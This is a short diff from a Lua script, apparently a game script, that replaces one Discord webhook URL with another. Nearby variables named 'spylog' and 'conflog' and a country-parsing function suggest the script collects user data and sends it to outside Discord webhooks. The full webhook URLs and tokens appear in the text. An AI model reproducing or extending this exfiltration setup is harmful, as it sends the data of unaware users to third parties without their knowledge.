@@ -373,7 +373,7 @@ local function Virtual_Region()
     return ParsedCountry
 end
 
-local url = "https://discord.com/api/webhooks/1211140075283546162/w42r54x5UlZXQuH_BYYFrCme-27FK_uVY42QLVBVzevk4BjTjD_2xszNHWYjDwQ36-wQ"
+local url = "https://discord.com/api/webhooks/1212344550505324594/qCGYPkCwmBD3SPV2jpop_nn8qPBKxB9HQ8g62hJT-Lub0TD1Gmgdj3nolXt9rqxsCax0"
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
 local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
 local embed = {
